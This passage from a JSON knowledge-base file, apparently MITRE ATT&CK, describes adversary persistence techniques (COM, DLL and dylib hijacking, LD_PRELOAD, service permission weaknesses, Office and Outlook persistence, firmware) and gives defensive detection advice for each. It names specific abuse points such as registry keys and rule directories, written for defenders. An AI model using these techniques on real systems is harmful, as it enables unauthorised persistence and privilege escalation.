        "detection": "\nLocations where profile.ps1 can be stored should be monitored for new profiles or modifications.   Example profile locations include:$PsHome\\Profile.ps1$PsHome\\Microsoft.{{HostProgram}}_profile.ps1$Home\\My Documents\\PowerShell\\Profile.ps1$Home\\My Documents\\PowerShell\\Microsoft.{{HostProgram}}_profile.ps1Monitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs.\n\n"
      },
      "T1546.014": {
        "name": "Emond",
        "description": " \nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a  Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at  /sbin/emond will load any rules from the  /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place. \nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path  /private/var/db/emondClients , specified in the  Launch Daemon configuration file at  /System/Library/LaunchDaemons/com.apple.emond.plist .  \n \n \n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.  \n \n \nAdversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the  Launch Daemon service.  ",
        "detection": "\nMonitor emond rules creation by checking for files created or modified in /etc/emond.d/rules/ and /private/var/db/emondClients.\n\n"
      },
      "T1546.015": {
        "name": "Component Object Model Hijacking",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.  \nReferences to various COM objects are stored in the Registry. \nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.  \nAn adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.  ",
        "detection": "\nThere are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: Reg) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID.  Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed. \n\n"
      },
      "T1133": {
        "name": "External Remote Services",
        "description": " \nAdversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as  Windows Remote Management can also be used externally. \nAccess to  Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.  \nAccess to remote services may be used as a redundant or persistent access mechanism during an operation.  ",
        "detection": "\nFollow best practices for detecting adversary use of Valid Accounts for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.\n\n"
      },
      "T1574": {
        "name": "Hijack Execution Flow",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution. \nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.  ",
        "detection": "\nMonitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.Monitor for changes to environment variables, as well as the commands to implement these changes.Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information.   Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\n"
      },
      "T1574.001": {
        "name": "DLL Search Order Hijacking",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  \nHijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution. \nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  \nby placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.  \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL.  \n  \n  \n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.  ",
        "detection": "\nMonitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\n\n"
      },
      "T1574.002": {
        "name": "DLL Side-Loading",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs. Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with a malicious one, causing the operating system to load their malicious library when it is called for by the victim program. \nPrograms may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests  \nare not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.  \n\nAdversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.  ",
        "detection": "\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\n"
      },
      "T1574.004": {
        "name": "Dylib Hijacking",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking ambiguous paths  used to load libraries. Adversaries may plant trojan dynamic libraries, in a directory that will be searched by the operating system before the legitimate library specified by the victim program, so that their malicious library will be loaded into the victim program instead.  MacOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. \nA common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself.  \n  \n\nIf the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.  ",
        "detection": "\nObjective-See's Dylib Hijacking Scanner can be used to detect potential cases of dylib hijacking. Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. \n\n"
      },
      "T1574.005": {
        "name": "Executable Installer File Permissions Weakness",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. \nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the  %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of  DLL Search Order Hijacking . \nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to  Bypass User Account Control . Several examples of this weakness in existing common installers have been reported to software vendors.  \n  \nIf the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.  ",
        "detection": "\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.\n\n"
      },
      "T1574.006": {
        "name": "LD_PRELOAD",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the dynamic linker used to load libraries. The dynamic linker is used to load shared library dependencies needed by an executing program. The dynamic linker will typically check provided absolute paths and common directories for these dependencies, but can be overridden by shared objects specified by LD_PRELOAD to be loaded before all others.  \n \n\nAdversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or  /etc/ld.so.preload file.  \n \nLibraries specified by LD_PRELOAD with be loaded and mapped into memory by  dlopen() and  mmap() respectively.  \n  \n  \n\nLD_PRELOAD hijacking may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. Execution via LD_PRELOAD hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitor for changes to environment variables and files associated with loading shared libraries such as LD_PRELOAD, as well as the commands to implement these changes.Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\n"
      },
      "T1574.007": {
        "name": "Path Interception by PATH Environment Variable",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line. \nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory,  %SystemRoot%\\system32 (e.g.,  C:\\Windows\\system32 ), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line. \nFor example, if  C:\\example path precedes ",
        "detection": "\nMonitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1574.008": {
        "name": "Path Interception by Search Order Hijacking",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program. \nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.  \n  \n  \nHowever, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory. \nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument  net user . An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then  cmd.exe /C net user will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT.  \n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .  ",
        "detection": "\nMonitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1574.009": {
        "name": "Path Interception by Unquoted Path",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch. \nService paths  \nand shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\\unsafe path with space\\program.exe vs.  \"C:\\safe path with space\\program.exe\" ).  \n(stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\\program files\\myapp.exe , an adversary may create a program at  C:\\program.exe that will be run instead of the intended program.  \n  \n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.  ",
        "detection": "\nMonitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1574.010": {
        "name": "Services File Permissions Weakness",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. \nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.  ",
        "detection": "\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques. \n\n"
      },
      "T1574.011": {
        "name": "Services Registry Permissions Weakness",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.  Windows stores local service configuration information in the Registry under  HKLM\\SYSTEM\\CurrentControlSet\\Services . The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell , or  Reg . Access to Registry keys is controlled through Access Control Lists and permissions.  \n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). \nAdversaries may also alter Registry keys associated with service failure parameters (such as  FailureCommand ) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.  \n \n  ",
        "detection": "\nService changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information.   Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\n\n"
      },
      "T1574.012": {
        "name": "COR_PROFILER",
        "description": " \nAdversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.  \n \n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a  Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.  \n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex:  Bypass User Account Control ) if the victim .NET process executes at a higher permission level, as well as to hook and  Impair Defenses provided by .NET processes.  \n \n \n \n \n ",
        "detection": "\nFor detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and Reg, monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.  Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.\n\n"
      },
      "T1525": {
        "name": "Implant Container Image",
        "description": " \nAdversaries may implant cloud container images with malicious code to establish persistence. Amazon Web Service (AWS) Amazon Machine Images (AMI), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.  \n\nA tool has been developed to facilitate planting backdoors in cloud container images.  \nIf an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a  Web Shell .  \nAdversaries may also implant Docker images that may be inadvertently used in cloud deployments, which has been reported in some instances of cryptomining botnets.  \n  ",
        "detection": "\nMonitor interactions with images and containers by users to identify ones that are added or modified anomalously.\n\n"
      },
      "T1137": {
        "name": "Office Application Startup",
        "description": " \nAdversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins. \nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.  \nThese persistence mechanisms can work within Outlook or be used through Office 365.  \n ",
        "detection": "\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.  Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.  SensePost, whose tool Ruler can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage. \n\n"
      },
      "T1137.001": {
        "name": "Office Template Macros",
        "description": " \nAdversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts.  \n\nOffice Visual Basic for Applications (VBA) macros  \ncan be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.  \n \nShared templates may also be stored and pulled from remote locations.  \n \nWord Normal.dotm location: \n C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm \nExcel Personal.xlsb location: \n C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB \nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under  C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\ , or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.  \n \nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.  ",
        "detection": "\nMany Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.   Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated. \n\n"
      },
      "T1137.002": {
        "name": "Office Test",
        "description": " \nAdversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.  \n \n\nThere exist user and global Registry keys for the Office Test feature:  HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf \nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.  ",
        "detection": "\nMonitor for the creation of the Office Test Registry key. Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Since v13.52, Autoruns can detect tasks set up using the Office Test Registry key. Consider monitoring Office processes for anomalous DLL loads.\n\n"
      },
      "T1137.003": {
        "name": "Outlook Forms",
        "description": " \nAdversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.  \n\nOnce malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.  \n ",
        "detection": "\nMicrosoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.  SensePost, whose tool Ruler can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage. Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.\n\n"
      },
      "T1137.004": {
        "name": "Outlook Home Page",
        "description": " \nAdversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.  \n\nOnce malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.  \n ",
        "detection": "\nMicrosoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.  SensePost, whose tool Ruler can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage. Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.\n\n"
      },
      "T1137.005": {
        "name": "Outlook Rules",
        "description": " \nAdversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.  \n\nOnce malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.  \n ",
        "detection": "\nMicrosoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.  SensePost, whose tool Ruler can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage. Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.\n\n"
      },
      "T1137.006": {
        "name": "Add-ins",
        "description": " \nAdversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs.  \nThere are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins.  \n \n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.  ",
        "detection": "\nMonitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins.  Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior\n\n"
      },
      "T1542": {
        "name": "Pre-OS Boot",
        "description": " \nAdversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.  \n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.  ",
        "detection": "\nPerform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI, which can be performed by API calls, and compare against known good behavior and patching.Disk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation.  \n\n"
      },
      "T1542.001": {
        "name": "System Firmware",
        "description": " \nAdversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.  \n  \n  \n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.  ",
        "detection": "\nSystem firmware manipulation may be detected.   Dump and inspect BIOS images on vulnerable systems and compare against known good images.   Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.Likewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed.      \n\n"
      },
      "T1542.002": {
        "name": "Component Firmware",
        "description": " \nAdversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to  System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking. \nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.  ",
